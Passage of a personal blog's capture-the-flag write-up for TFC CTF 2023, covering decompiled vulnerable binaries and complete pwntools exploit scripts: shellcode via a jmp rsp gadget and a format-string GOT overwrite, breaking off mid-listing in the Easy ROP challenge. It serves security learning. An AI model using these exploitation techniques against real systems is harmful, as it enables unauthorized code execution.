<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="This weekend, i joined  TheFewChosen CTF 2023 where i attempted to solve pwn and few other challenges over there However, didn’t able to perform good but hmmm taught me plenty of new things and made">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF WriteUp: TFC CTF 2023">
<meta property="og:url" content="https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/index.html">
<meta property="og:site_name" content="sf4ult">
<meta property="og:description" content="This weekend, i joined  TheFewChosen CTF 2023 where i attempted to solve pwn and few other challenges over there However, didn’t able to perform good but hmmm taught me plenty of new things and made">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/TFC.jpeg">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/diary_ck.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/diary_objdump.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/shello-world_ps.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/easy_rop_leak.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate1.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate2.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate2.1.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate3.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate4.gif">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate5.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate6.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/pwn/pwngate7.png">
<meta property="og:image" content="https://sf4ult.github.io/imgs/post6/cry/cry1.png">
<meta property="article:published_time" content="2023-07-31T20:10:15.000Z">
<meta property="article:modified_time" content="2023-08-10T00:25:29.521Z">
<meta property="article:author" content="Durgesh">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="reversing">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="forensic">
<meta property="article:tag" content="crypto">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sf4ult.github.io/imgs/post6/TFC.jpeg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CTF WriteUp: TFC CTF 2023</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 vazir">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archive">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/22/post5/bdsecCTF_2023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&text=CTF WriteUp: TFC CTF 2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&is_video=false&description=CTF WriteUp: TFC CTF 2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF WriteUp: TFC CTF 2023&body=Check out this article: https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&title=CTF WriteUp: TFC CTF 2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&name=CTF WriteUp: TFC CTF 2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/08/01/post6/tfcCTF_2023/&t=CTF WriteUp: TFC CTF 2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Diary"><span class="toc-number">1.1.</span> <span class="toc-text">Diary</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vuln-func"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">vuln func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#helper-func"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">helper func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shello-world"><span class="toc-number">1.2.</span> <span class="toc-text">shello-world</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vuln-func-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">vuln func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-ROP"><span class="toc-number">1.3.</span> <span class="toc-text">Easy ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-number">1.4.</span> <span class="toc-text">random</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-1"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwngate"><span class="toc-number">1.5.</span> <span class="toc-text">pwngate</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-2"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#menu-func"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">menu func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#divergence-meter-func"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">divergence_meter func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#current-leap-func"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">current_leap func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#timeleap-func"><span class="toc-number">1.5.0.5.</span> <span class="toc-text">timeleap func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sanity-func"><span class="toc-number">1.5.0.6.</span> <span class="toc-text">sanity func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#okabe-func"><span class="toc-number">1.5.0.7.</span> <span class="toc-text">okabe func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#notes"><span class="toc-number">1.6.</span> <span class="toc-text">notes</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-3"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pass"><span class="toc-number">2.1.</span> <span class="toc-text">pass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main-func-4"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">main func</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve"><span class="toc-number">2.1.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic"><span class="toc-number">2.2.</span> <span class="toc-text">Forensic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#down-bad"><span class="toc-number">2.3.</span> <span class="toc-text">down bad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cry"><span class="toc-number">2.4.</span> <span class="toc-text">Cry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mayday"><span class="toc-number">2.5.</span> <span class="toc-text">mayday</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CTF WriteUp: TFC CTF 2023
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Durgesh</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-31T20:10:15.000Z" class="dt-published" itemprop="datePublished">2023-08-01</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/crypto/" rel="tag">crypto</a>, <a class="p-category" href="/tags/forensic/" rel="tag">forensic</a>, <a class="p-category" href="/tags/misc/" rel="tag">misc</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/reversing/" rel="tag">reversing</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><img src="/imgs/post6/TFC.jpeg" alt="front.png"></p>
<p>This weekend, i joined  TheFewChosen CTF 2023 where i attempted to solve pwn and few other challenges over there However, didn’t able to perform good but hmmm taught me plenty of new things and made me feel i am noob hehe just kidding i am already enough :p </p>
<p>some of pwn challenges i didn’t solve by myself i solved some after CTF by taking help from other participants In discord and by referring writeups i’ll gonna write those all as this blog is a medium for me to referencing the problems in future</p>
<p>All challenges can be found <a target="_blank" rel="noopener" href="https://github.com/Durge5h/CTFs/tree/main/Competition/TFC-CTF-2023">here</a></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Diary"><a href="#Diary" class="headerlink" title="Diary"></a>Diary</h3><p>this binary contain two main functions <code>vuln</code> and <code>helper</code></p>
<h5 id="vuln-func"><a href="#vuln-func" class="headerlink" title="vuln func"></a>vuln func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 local_108;</span><br><span class="line">  undefined8 local_100;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dear diary...&quot;</span>);</span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_108,<span class="number">1024</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>so here we have BOF in <code>fegets</code> function variable <em>local_108</em> being over feeded so firt thing comes into mind is that we can <em>ret2shellcode</em> if binary has NX disabled lets check  </p>
<p><img src="/imgs/post6/pwn/diary_ck.png" alt="diary_ck.png"></p>
<p>okay we do have binary with rwx so now lets craft the payload and feed the program but where to return so that we can make shellcode execute? firstly i struggled to find the solution as i forgot about <code>helper</code> function </p>
<h5 id="helper-func"><a href="#helper-func" class="headerlink" title="helper func"></a>helper func</h5><p><img src="/imgs/post6/pwn/diary_objdump.png" alt="diary_objdump.png"></p>
<p>so as you can see we do have gadget like <strong>jump rsp</strong> that can help to jump in to the stack and execute the shellcode so final payload will be like this </p>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./diary&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">break *0x00000000004012aa</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line">    <span class="comment">#r = remote(&#x27;challs.tfcctf.com&#x27;,32484)</span></span><br><span class="line">    shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="string">&#x27;amd64&#x27;</span>)   </span><br><span class="line">    <span class="comment">#print(f&quot;len of shell: &#123;len(shellcode)&#125;&quot;) </span></span><br><span class="line"></span><br><span class="line">    jmp_rsp = elf.sym.helper+<span class="number">4</span> </span><br><span class="line"></span><br><span class="line">    payload = flat (</span><br><span class="line">        asm(<span class="string">&#x27;nop&#x27;</span>)*<span class="number">264</span>,</span><br><span class="line">        jmp_rsp,</span><br><span class="line">        shellcode,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<h3 id="shello-world"><a href="#shello-world" class="headerlink" title="shello-world"></a>shello-world</h3><h5 id="vuln-func-1"><a href="#vuln-func-1" class="headerlink" title="vuln func"></a>vuln func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 local_108;</span><br><span class="line">  undefined8 local_100;</span><br><span class="line">  </span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_108,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">char</span> *)&amp;local_108);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>here we have format string vulnerability in this code and as RELRO is partial we can overwrite the GOT with <code>win</code> function, lets check the offset using this script </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shello-world&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        p = process()</span><br><span class="line">        payload = <span class="string">&#x27;AAAAAAAA,%&#123;i&#125;$p&#x27;</span>.<span class="built_in">format</span>(i=i)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(p.recvall(), i)</span><br></pre></td></tr></table></figure>


<p><img src="/imgs/post6/pwn/shello-world_ps.png" alt="shello-world_ps.png"></p>
<h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shello-world&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process()</span></span><br><span class="line">p = remote(<span class="string">&quot;challs.tfcctf.com&quot;</span>,<span class="number">32419</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">got_ow</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">                elf.got.putchar: elf.sym.win</span><br><span class="line">            &#125;</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>,payload,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload </span><br><span class="line"></span><br><span class="line">payload = got_ow() </span><br><span class="line"><span class="comment">#p.recvuntil(&quot;me? : &quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<p>reference  : <a target="_blank" rel="noopener" href="https://axcheron.github.io/exploit-101-format-strings/">https://axcheron.github.io/exploit-101-format-strings/</a> </p>
<h3 id="Easy-ROP"><a href="#Easy-ROP" class="headerlink" title="Easy ROP"></a>Easy ROP</h3><h5 id="main-func"><a href="#main-func" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>	<span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"> 2	</span><br><span class="line"> 3	&#123;</span><br><span class="line"> <span class="number">4</span>	  undefined4 uVar1;</span><br><span class="line"> <span class="number">5</span>	  <span class="type">long</span> i;</span><br><span class="line"> <span class="number">6</span>	  undefined8 *puVar2;</span><br><span class="line"> <span class="number">7</span>	  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line"> <span class="number">8</span>	  byte bVar3;</span><br><span class="line"> <span class="number">9</span>	  <span class="type">int</span> local_214;</span><br><span class="line"><span class="number">10</span>	  undefined4 local_210;</span><br><span class="line"><span class="number">11</span>	  uint local_20c;</span><br><span class="line"><span class="number">12</span>	  undefined8 local_208 [<span class="number">63</span>];</span><br><span class="line"><span class="number">13</span>	  <span class="type">long</span> local_10;</span><br><span class="line"><span class="number">14</span>	  </span><br><span class="line"><span class="number">15</span>	  bVar3 = <span class="number">0</span>;</span><br><span class="line"><span class="number">16</span>	  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line"><span class="number">17</span>	  setup();</span><br><span class="line"><span class="number">18</span>	  puVar2 = local_208;</span><br><span class="line"><span class="number">19</span>	  <span class="keyword">for</span> (i = <span class="number">62</span>; i != <span class="number">0</span>; i = i + <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="number">20</span>	    *puVar2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">21</span>	    puVar2 = puVar2 + (ulong)bVar3 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="number">22</span>	  &#125;</span><br><span class="line"><span class="number">23</span>	  *(undefined4 *)puVar2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">24</span>	  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line"><span class="number">25</span>	    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line"><span class="number">26</span>	      local_210 = <span class="number">0</span>;</span><br><span class="line"><span class="number">27</span>	      local_20c = <span class="number">0</span>;</span><br><span class="line"><span class="number">28</span>	      <span class="built_in">puts</span>(<span class="string">&quot;Welcome to easyrop!&quot;</span>);</span><br><span class="line"><span class="number">29</span>	      <span class="built_in">puts</span>(<span class="string">&quot;Press \&#x27;1\&#x27; to write and \&#x27;2\&#x27; to read!&quot;</span>);</span><br><span class="line"><span class="number">30</span>	      __isoc99_scanf(&amp;DAT_00402017,&amp;local_214);</span><br><span class="line"><span class="number">31</span>	      <span class="keyword">if</span> (local_214 != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="number">32</span>	      local_20c = get_index();</span><br><span class="line"><span class="number">33</span>	      uVar1 = get_number();</span><br><span class="line"><span class="number">34</span>	      *(undefined4 *)((<span class="type">long</span>)local_208 + (ulong)local_20c * <span class="number">4</span>) = uVar1;</span><br><span class="line"><span class="number">35</span>	    &#125;</span><br><span class="line"><span class="number">36</span>	    <span class="keyword">if</span> (local_214 != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="number">37</span>	    local_20c = get_index();</span><br><span class="line"><span class="number">38</span>	    <span class="built_in">printf</span>(<span class="string">&quot;The number at index %d is %x\n&quot;</span>,(ulong)local_20c,</span><br><span class="line"><span class="number">39</span>	           (ulong)*(uint *)((<span class="type">long</span>)local_208 + (ulong)local_20c * <span class="number">4</span>));</span><br><span class="line"><span class="number">40</span>	  &#125;</span><br><span class="line"><span class="number">41</span>	  <span class="built_in">puts</span>(<span class="string">&quot;Bye :(&quot;</span>);</span><br><span class="line"><span class="number">42</span>	  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line"><span class="number">43</span>	                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line"><span class="number">44</span>	    __stack_chk_fail();</span><br><span class="line"><span class="number">45</span>	  